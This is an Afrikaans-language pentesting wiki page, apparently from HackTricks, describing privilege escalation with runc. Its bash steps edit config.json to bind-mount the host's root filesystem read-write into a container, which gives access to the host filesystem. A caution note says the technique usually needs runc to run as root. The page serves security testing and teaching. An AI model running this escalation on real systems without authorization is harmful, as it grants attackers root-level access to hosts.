# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basiese inligting

As jy meer oor **runc** wil leer, kyk na die volgende bladsy:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

As jy vind dat `runc` op die host geïnstalleer is, kan jy moontlik **'n container laat loop wat die root /-vouer van die host mount**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Dit sal nie altyd werk nie, aangesien die verstekwerking van runc is om as root te loop; om dit as ’n onbevoorregte gebruiker te laat loop, kan dus eenvoudig nie werk nie (tensy jy ’n rootless-konfigurasie het). Om ’n rootless-konfigurasie die verstek te maak, is oor die algemeen nie ’n goeie idee nie, omdat daar heelwat beperkings binne rootless-houers is wat nie buite rootless-houers geld nie.

{{#include ../../banners/hacktricks-training.md}}
